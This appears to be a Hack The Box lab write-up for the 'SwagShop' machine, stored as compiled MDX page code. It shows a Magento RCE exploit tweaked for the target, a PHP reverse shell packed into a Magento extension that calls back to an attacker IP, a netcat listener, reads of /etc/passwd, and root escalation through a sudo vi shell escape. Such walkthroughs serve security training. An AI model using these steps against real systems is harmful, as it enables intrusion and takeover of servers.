\"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAA7UlEQVQoz52Ry46CMBRA+f/PGN250h0mupiVE9FEogmiCZNYwAhtSR9AxVYv4J7qSW56Fz29jzqa3szWvZ0O5+g/ieMoioqieNrhaHzVv5PstN/tD9vNJgiCXjbGDMvtveeXOIJzdEFpkiCECKGWNd9yXVUY59AqIYQxJoRomsZ0DMsgZFnGGE/TK85zSqm6320rQxzD0PM8aLeqoY+qLCXnvFbKTj6G67VntG46Hj36YSWv/lbT2RQSWcqyQ8g2gfnhkQHZ9/3FYgkLUgrmbYHDZm2t7Lrzn9EYEs647GpCwPxWbcN6MCYf/XDPC0VwuxlsySgFAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/bfff34f3694a1d39da245647366b7f29/aa8f6/htb_swagshop_web.webp 683w\"],\n    \"sizes\": \"(max-width: 683px) 100vw, 683px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/bfff34f3694a1d39da245647366b7f29/08552/htb_swagshop_web.png 683w\"],\n    \"sizes\": \"(max-width: 683px) 100vw, 683px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/bfff34f3694a1d39da245647366b7f29/08552/htb_swagshop_web.png\",\n    \"alt\": \"htb_swagshop_web.png\",\n    \"title\": \"htb_swagshop_web.png\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"we find a \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Magento\"), \" shop with some HTB swag available.The pages are copyrighted from 2014, We can see at \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://www.cloudways.com/blog/magento-versions/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"this\"), \" page that the last released version in 2014 was 1.9.x.\"), mdx(\"p\", null, \"Browsing around, you will notice that the items are placed under a folder called \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"index.php/\"), \" (\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"http://10.10.10.140/index.php/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"http://10.10.10.140/index.php/\"), \")\"), mdx(\"p\", null, \"by running two \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"GoBuster\"), \" scans on \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/\"), \" and \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/index.php/\"), \" we find the admin panel at \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/index.php/admin/\"), \" \"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1380px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"35.14492753623188%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABVUlEQVQY0yWQyWocQRBE+//1Db775OVmHyywMMgyQmANo1k8Pb2qtq69KmvpkoRKchAkcYjkJdnEEKy1LkafEuRcHdY1vAcJwJ3j3gsAEYKMSaas1iLLs81rSrEx1vbTFF5ekFIdRiNj+75r5/m+bY+UDca2QuzmcXPY3v29+XP94/fl16svH/a3P8vTcwNa09NJxzBivG87oox0sBgzLYIa185o1/UjZT3Cp2HYn/vN7nB39b3b3K7lqUkpA0fyfKPZ7IwMViWwDoILwTjPlVL1Ng81S+MMm+zjYUCICJlzblLOHry2xghsWOf4KMmZcM6kFEpJrYTWhC/jPB7+HbeXHx8+X/z69um4vS+lVHICCCGmtJa4FgfReK+0MkZXW2e0lmxhwzwd2/Oun0+PfCKMS/VOTikAvD3cuYrHCDFKCSGUUowxY6zOhf0X9c7Wdu1X1cVXc8iAdXty5NgAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/a1ab70a67e7399044f81c8a25ed2ff06/a305d/admin_login.webp 1380w\"],\n    \"sizes\": \"(max-width: 1380px) 100vw, 1380px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/a1ab70a67e7399044f81c8a25ed2ff06/23a08/admin_login.png 1380w\"],\n    \"sizes\": \"(max-width: 1380px) 100vw, 1380px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/a1ab70a67e7399044f81c8a25ed2ff06/23a08/admin_login.png\",\n    \"alt\": \"admin_login.png\",\n    \"title\": \"admin_login.png\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"And \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/downloader/\"), \" to access \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Magento\"), \" Connect Manager. You can upload new\\n\", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Magento\"), \" packages, which contains PHP files inside.\\n\", mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1508px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"66.9761273209549%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABL0lEQVQoz2PQcvLUc/PRcfXWcnRTN9bXNNZTMzFSsXWRt3QQMTDHikQNLfi0jYy9Axkqeib1L1g6YeGytqkzWpsrOppLG9saeuYubpg0PaOuNbO+DRNlNbSn1jTX9E9l+PPnz28Q+v3n79+/////AaJ//4AiYB4+ANQI0vyfLIBFM5D76dOnb9++/QKD379//4IBTJXomn/8+HHv3r1Xr159/vz5IwwA2V+/fgXqJ6D558+fL1++fPb06ePHj0AASD1+/OTpsy9fvgBdQVjzk8ePX7x4+frT97efvr59/+Ht+49v3n34/JkIzb9+/nz1+vX7t28+Xdn14f6Fj5+/fvz4AehyomwGqgBa/uP7t29Pr3978+THz18/wOD79++ENf+DATQuXITIeP5H20QCAP5PsPiu00uiAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/164a418ba9856475415b6ddfdd4c0bb7/c7b4c/downloader_login.webp 1508w\"],\n    \"sizes\": \"(max-width: 1508px) 100vw, 1508px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/164a418ba9856475415b6ddfdd4c0bb7/4ec8e/downloader_login.png 1508w\"],\n    \"sizes\": \"(max-width: 1508px) 100vw, 1508px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/164a418ba9856475415b6ddfdd4c0bb7/4ec8e/downloader_login.png\",\n    \"alt\": \"downloader_login.png\",\n    \"title\": \"downloader_login.png\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"h3\", {\n    \"id\": \"❯-exploitation\"\n  }, \"\\u276F Exploitation\"), mdx(\"p\", null, \"We use \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"searchsploit\"), \" to find exploits in \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Magneto 1.9.x\"), \" \"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"905px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"39.11602209944751%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABVklEQVQY002QWXKDMBAFfZF4AWxLIEASCK0g7Nh4i7Pc/zJ5JPlI1RQ1TKmlN71g3DJmadGRXAkxENomaZlkVZpV/7/Ztk6ycpOyTcKSdB7id0F2DaVqtxfLNXlZ7Zcbutrk/2u5pum24rwvS5sXHSsNMMxx0WKr220lKWmlHDgfpIyqPUo5oqlqjyxNM1aVQ6/aQ6deUUodaa5mmLw5qnVVuOBuwd+Du/f+bs1kzcWYSeszyIJp3Z16/4j9M4bncfxCCiSaYeacrAelDlafnbl4e+vUybubs9dGjkiIDY0+D+ExDu+owT/+4N2bESF6fe30CWTbjHgE2bBkXYc9aXAo23HdnYOf4fnx/smYmeFqivUUrbvgqNVIe0U87AmFMA9D66QAbPSE+SF+HuMHGizysiILKSLpTS7Nj0wtBZyNAuZE/JXHecAtXAw/ql4RoW0OgOH8Gw48X+un/KBtAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/7eb81925d7b8163c861c0c069a299151/d7601/searchsploit.webp 905w\"],\n    \"sizes\": \"(max-width: 905px) 100vw, 905px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/7eb81925d7b8163c861c0c069a299151/94d8e/searchsploit.png 905w\"],\n    \"sizes\": \"(max-width: 905px) 100vw, 905px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/7eb81925d7b8163c861c0c069a299151/94d8e/searchsploit.png\",\n    \"alt\": \"searchsploit.png\",\n    \"title\": \"searchsploit.png\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"and we notice a remote code execution exploit\"), mdx(\"table\", null, mdx(\"thead\", {\n    parentName: \"table\"\n  }, mdx(\"tr\", {\n    parentName: \"thead\"\n  }, mdx(\"th\", _extends({\n    parentName: \"tr\"\n  }, {\n    \"align\": null\n  }), \"Exploit Title\"), mdx(\"th\", _extends({\n    parentName: \"tr\"\n  }, {\n    \"align\": null\n  }), \"Path  (/usr/share/exploitdb/)\"))), mdx(\"tbody\", {\n    parentName: \"table\"\n  }, mdx(\"tr\", {\n    parentName: \"tbody\"\n  }, mdx(\"td\", _extends({\n    parentName: \"tr\"\n  }, {\n    \"align\": null\n  }), \"Magento eCommerce - Remote Code Execution\"), mdx(\"td\", _extends({\n    parentName: \"tr\"\n  }, {\n    \"align\": null\n  }), \"exploits/xml/webapps/37977.py\")))), mdx(\"p\", null, \" We need to tweak the exploit a little for the odd \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$IP/index.php/admin\"), \" requirement instead of \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$IP/admin\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-Python\"\n  }), \"...\\ntarget = \\\"http://10.10.10.140/\\\"\\n\\nif not target.startswith(\\\"http\\\"):\\n   target = \\\"http://\\\" + target\\n\\nif target.endswith(\\\"/\\\"):\\n   target = target[:-1]\\n\\ntarget_url = target + \\\"/index.php\\\" + \\\"/admin/Cms_Wysiwyg/directive/index/\\\"\\n...\\n\")), mdx(\"p\", null, \"we run the script \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022 \\u279C python 37977.py  \\n \\u2514> WORKED\\n    Check http://10.10.10.140/admin with creds forme:forme\\n\")), mdx(\"p\", null, \"now we can log in to the admin panel \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/index.php/admin\"), \" and \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/downloader\"), \" with creds \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"forme:forme\")), mdx(\"hr\", null), mdx(\"h3\", {\n    \"id\": \"❯-getting-a-reverse-shell\"\n  }, \"\\u276F Getting a Reverse Shell\"), mdx(\"p\", null, \"Using the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Magento\"), \" Downloader/\", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Magento\"), \" Connect, we attempt to upload an\\nextension with a PHP reverse shell.\"), mdx(\"p\", null, \"Download any legit \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Magento\"), \" package, we\\u2019ll use \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"LavaMagentoBD\"), \" from \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/P34C3-07/LavaMagentoBD\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"GitHub/P34C3-07/LavaMagentoBD\"), \" then extract \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"lavamagento_bd.tgz\"), \" we\\u2019ll have to modify its contents.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C tar -xzvf lavalamp_magento_bd.tgz\\n\")), mdx(\"p\", null, \"edit the file \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"./App/code/community/Lavalamp/Connector/controllers/IndexController.php\"), \" and replace its contents with a PHP reverse shell, we\\u2019ll use PHP-Reverse-Shell from \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/pentestmonkey/php-reverse-shell\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Github/pentestmonkey/php-reverse-shell\"), \" make sure to change the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$IP\"), \" field to your IP address. we will use port \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"1234\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"$ip = '10.10.14.115';  // CHANGE THIS\\n$port = 1234;\\n\")), mdx(\"p\", null, \"get the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"MD5\"), \" hash for the file\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022 \\u279C md5sum ./App/code/community/Lavalamp/Connector/controllers/IndexController.php    \\n\\u2514> 7587816c42712b0c9fe6dccb2c6c5300  IndexController.php\\n\")), mdx(\"p\", null, \"copy it then edit \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"package.xml\"), \" and replace \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"IndexController.php\"), \" hash\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-xml\"\n  }), \"    <dir name=\\\"controllers\\\">\\n        <file hash=\\\"7587816c42712b0c9fe6dccb2c6c5300\\\" \\n              name=\\\"IndexController.php\\\"/>\\n    </dir>\\n\")), mdx(\"p\", null, \"compress the files back into \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \".tgz\"), \" file\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C tar -cvzf lavalamp_magento_bd.tgz -c ./*\\n\")), mdx(\"p\", null, \"then upload the file to \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/downloader/\"), \" login with creds \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"forme:forme\"), \" if the extension is loaded successfully you should see\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1149px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"36.81462140992167%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAXklEQVQY08WOSw6DMAxEPZ8oBlU0gd7/rE04AKXd9GlkefPsCTf5KW8aCwogwOckAnFBZoYPl5fV7G6uZFIPaSEXjiuf5D5/ehcTw2Rl3GPKs+RIOVPBii/kn/mr/AbYBAJqW0VoJgAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/b4f74a195e0f4a0da633e6d5f3c10a09/147f1/uploaded.webp 1149w\"],\n    \"sizes\": \"(max-width: 1149px) 100vw, 1149px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/b4f74a195e0f4a0da633e6d5f3c10a09/52927/uploaded.png 1149w\"],\n    \"sizes\": \"(max-width: 1149px) 100vw, 1149px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/b4f74a195e0f4a0da633e6d5f3c10a09/52927/uploaded.png\",\n    \"alt\": \"uploaded.png\",\n    \"title\": \"uploaded.png\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"start listening using netcat\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C nc -v -n -l -p 1234\\n\")), mdx(\"p\", null, \"then in the browser navigate to \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/app/code/community/Lavalamp/Connector/controllers/IndexController.php\"), \"\\nin the terminal you should see that we got a reverse shell \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C nc -nvlp 1234\\n\\u2514> listening on [any] 1234 ...\\n   connect to [<IP>] from (UNKNOWN) [10.10.10.140] 44650\\n   Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP x86_64 GNU/Linux\\n   13:22:28 up 32 min,  0 users,  load average: 4.31, 2.61, 1.86\\n   USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\\n   uid=33(www-data) gid=33(www-data) groups=33(www-data)\\n   /bin/sh: 0: can't access tty; job control turned off\\n\")), mdx(\"p\", null, \"we  are connected now with the username \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"www-data\"), \", but we still need to spawn a bash shell with tty\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"$ python -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'\\nwww-data@swagshop:/$ \\n\")), mdx(\"h2\", {\n    \"id\": \"❯-own-user\"\n  }, \"\\u276F Own User\"), mdx(\"p\", null, \"Now that we have a shell on the box we can view \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"etc/passwd\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C www-data@swagshop:/$ cat /etc/passwd\\n\\u2514> cat /etc/passwd\\n   root:x:0:0:root:/root:/bin/bash\\n   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\n   bin:x:2:2:bin:/bin:/usr/sbin/nologin\\n   sys:x:3:3:sys:/dev:/usr/sbin/nologin\\n   sync:x:4:65534:sync:/bin:/bin/sync\\n   games:x:5:60:games:/usr/games:/usr/sbin/nologin\\n   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\n   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\n   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\n   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\n   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\n   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\n   www-data:x:33:33:www-data:/var/www:/bin/bash\\n   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\n   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\n   irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\\n   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:...\\n   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n   systemd-timesync:x:100:102:systemd Time Synchronization,,,:...\\n   systemd-network:x:101:103:systemd Network Management,,,:...\\n   systemd-resolve:x:102:104:systemd Resolver,,,:...\\n   systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/...\\n   syslog:x:104:108::/home/syslog:/bin/false\\n   _apt:x:105:65534::/nonexistent:/bin/false\\n   lxd:x:106:65534::/var/lib/lxd/:/bin/false\\n   mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false\\n   messagebus:x:108:112::/var/run/dbus:/bin/false\\n   uuidd:x:109:113::/run/uuidd:/bin/false\\n   dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false\\n   sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin\\n   haris:x:1000:1000:haris,,,:/home/haris:/bin/bash\\n\")), mdx(\"p\", null, \"we notice the user \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"haris\"), \" \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C www-data@swagshop:/$ ls -alh /home/haris\\n\\u2514> ls -alh /home/haris\\n   total 36K\\n   drwxr-xr-x 3 haris haris 4.0K May  8 09:21 .\\n   drwxr-xr-x 3 root  root  4.0K May  2 14:48 ..\\n   -rw------- 1 haris haris   54 May  2 14:56 .Xauthority\\n   lrwxrwxrwx 1 root  root     9 May  8 09:20 .bash_history -> /dev/null\\n   -rw-r--r-- 1 haris haris  220 May  2 14:48 .bash_logout\\n   -rw-r--r-- 1 haris haris 3.7K May  2 14:48 .bashrc\\n   drwx------ 2 haris haris 4.0K May  2 14:49 .cache\\n   -rw------- 1 root  root     1 May  8 09:20 .mysql_history\\n   -rw-r--r-- 1 haris haris  655 May  2 14:48 .profile\\n   -rw-r--r-- 1 haris haris    0 May  2 14:49 .sudo_as_admin_successful\\n   -rw-r--r-- 1 haris haris   33 May  8 09:01 user.txt\\n\\n\")), mdx(\"p\", null, \"we find \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"user.txt\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C www-data@swagshop:/$ cat /home/haris/user.txt\\n\\u2514> cat /home/haris/user.txt\\n   <user flag>\\n\")), mdx(\"h2\", {\n    \"id\": \"❯-privilege-escalation-own-root\"\n  }, \"\\u276F Privilege Escalation: Own Root\"), mdx(\"p\", null, \"Enumerating the system leads to the finding that \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"sudo -l\"), \" returns the\\nlist of the user\\u2019s privileges, and shows that running \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"vi\"), \" with a specific path \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"/var/www/html/*\"), \"\\ngrants superuser privileges, without a password entry, required\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C www-data@swagshop:/$ sudo -l\\n\\u2514> sudo -l\\n   Matching Defaults entries for www-data on swagshop:\\n       env_reset, mail_badpass,\\n       secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\\\n       :/sbin\\\\:/bin\\\\:/snap/bin\\n   \\n   User www-data may run the following commands on swagshop:\\n       (root) NOPASSWD: /usr/bin/vi /var/www/html/*\\n\")), mdx(\"p\", null, \"open a file using \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"vi\"), \" in \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"/var/www/html/*\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C www-data@swagshop:/$ sudo /usr/bin/vi /var/www/html/Bad3r.sh\\n\\u2514> sudo /usr/bin/vi /var/www/html/Bad3r.sh\\n   Vim: Warning: Output is not to a terminal\\n   Vim: Warning: Input is not from a terminal\\n   \\n   E558: Terminal entry not found in terminfo\\n   \\u2018unknown\\u2019 not known. Available builtin terminals are:\\n    builtin_amiga\\n    builtin_beos-ansi\\n    builtin_ansi\\n    builtin_pcansi\\n    builtin_win32\\n    builtin_vt320\\n    builtin_vt52\\n    builtin_xterm\\n    builtin_iris-ansi\\n    builtin_debug\\n    builtin_dumb\\n   defaulting to \\u2018ansi\\u2019\\n\")), mdx(\"p\", null, \"inside \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"vi\"), \" you can spawn a root shell\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \":!/bin/bash\\n~\\n~\\n\")), mdx(\"p\", null, \"in the interactive shell, we can get the root flag\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C whoami\\n\\u2514> root\\n\\u2022\\u279C cat /root/root.txt\\n     <root flag>\\n        ___ ___\\n      /| |/|\\\\| |\\\\\\n     /_| \\xB4 |.` |_\\\\           We are open! (Almost)\\n     |     | .   |                                   |\\n     | --- | --- | --------------------------------- |\\n     |     | .   | Join the beta HTB Swag Store!     